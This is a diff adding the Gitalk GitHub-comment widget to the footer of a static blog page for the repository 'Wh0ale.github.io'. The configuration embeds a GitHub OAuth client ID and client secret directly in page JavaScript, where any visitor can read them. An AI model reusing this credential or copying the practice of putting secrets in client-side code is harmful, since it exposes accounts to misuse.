+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
